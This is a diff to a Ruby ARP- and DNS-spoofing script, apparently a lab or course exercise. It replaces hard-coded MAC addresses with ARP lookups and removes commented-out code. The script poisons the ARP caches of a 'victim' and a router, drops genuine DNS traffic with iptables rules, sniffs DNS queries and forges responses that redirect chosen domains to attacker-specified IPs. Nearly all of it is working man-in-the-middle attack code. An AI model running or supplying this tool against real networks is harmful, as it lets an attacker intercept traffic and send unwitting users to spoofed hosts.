@@ -49,7 +49,6 @@ config.each_line do |line|
     domain, ip = line.split(' ')
     $spoof_hash[".*#{domain}"] = ip
   end
-
 end
 
 # Parse command line arguments
@@ -74,16 +73,12 @@ if $target_ip.nil?
   abort("You must specify the victim's IP address and an IP address to spoof!")
 end
 # Get the mac addresses for all the necessary machines.
-#sender_mac = Mac.addr
-sender_mac = '00:26:82:c6:bf:82'
-target_mac = 'b8:e8:56:1a:88:8e'
-`ping -c 1 #{$target_ip}`
-#target_mac = `arp | grep #{$target_ip} | awk '{ print $3} '`
-#router_mac = `arp | grep #{$router_ip} | awk '{ print $3} '`
+sender_mac = Mac.addr
 
-#puts "Router Mac; " + router_mac
-puts "Sender Mac: " + sender_mac
-puts "Target Mac: " + target_mac
+`ping -c 1 #{$target_ip}`
+target_mac = `arp | grep #{$target_ip} | awk '{ print $3} '`
+router_mac = `arp | grep #{$router_ip} | awk '{ print $3} '`
+
 # Builds on the previous ARP spoofing example.
 # The sending of ARP packets is done in a separate thread.
 
@@ -100,9 +95,9 @@ arp_packet_target.arp_opcode = 2                        # arp code 2 == ARP repl
 # Construct the router's packet
 arp_packet_router = ARPPacket.new()
 arp_packet_router.eth_saddr = sender_mac       # sender's MAC address
-arp_packet_router.eth_daddr = '60:2a:d0:6b:1b:21'       # router's MAC address
+arp_packet_router.eth_daddr = router_mac       # router's MAC address
 arp_packet_router.arp_saddr_mac = sender_mac   # sender's MAC address
-arp_packet_router.arp_daddr_mac = '60:2a:d0:6b:1b:21'   # router's MAC address
+arp_packet_router.arp_daddr_mac = router_mac   # router's MAC address
 arp_packet_router.arp_saddr_ip = $target_ip         # target's IP
 arp_packet_router.arp_daddr_ip = $router_ip        # router's IP
 arp_packet_router.arp_opcode = 2                        # arp code 2 == ARP reply
@@ -223,7 +218,6 @@ def sendResponse(packet, domainName, spoof_ip)
 
   # Transaction ID
   response.payload = packet.payload[0,2]
-
   response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"
 
   # Domain name
@@ -323,7 +317,6 @@ def get_info(packet)
     else
       x = false
     end
-
   end
 
   return domain
@@ -369,45 +362,27 @@ def sniff(iface)
       spoof_ip = check_spoof(domain)
       pp "SPOOFIP: " + spoof_ip.to_s
       if !spoof_ip.nil?
-        #`iptables -A FORWARD -m u32 -p udp --dport 53 --u32 "0&0x0022=`+ packet.payload[0,2] +`"-j DROP`
-        #`iptables -A FORWARD -m u32 -p udp --dport 53 --u32 "0&0x0022=#{packet.payload[0,2]} -j DROP`
-        #`echo #{packet.payload[0,2]}`
-
         sendResponse(packet, domain, spoof_ip)
-       # `iptables -D FORWARD -p UDP --dport 53 -j DROP`
-       # `iptables -D FORWARD -p TCP --dport 53 -j DROP`
-        #`iptables -D FORWARD -m u32 -p udp --dport 53 --u32 "0&0x0022=`+ packet.payload[0,2] +`"-j DROP`
-        #`iptables -D FORWARD -m u32 -p udp --dport 53 --u32 "0&0x0022=#{packet.payload[0,2]} -j DROP`
       end
-
     end
-
   end
-
 end
 
 begin
-
 
   `iptables -A FORWARD -p UDP --dport 53 -j DROP`
   `iptables -A FORWARD -p TCP --dport 53 -j DROP`
 
   spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)}
 
-
   puts "Starting the sniffing..."
-  #sniff_thread = Thread.new{sniff($iface)}
+
   sniff($iface)
   spoof_thread.join
-  #sniff_thread.join
-  #Signal.trap("SIGINT") { Process.kill("INT", @pid); Process.wait; exit }
 
-    # Catch the interrupt and kill the thread
 rescue Interrupt
   puts "\nDNS spoof stopped by interrupt signal."
   `echo 0 > /proc/sys/net/ipv4/ip_forward`
   exit 0
-
-
 
 end
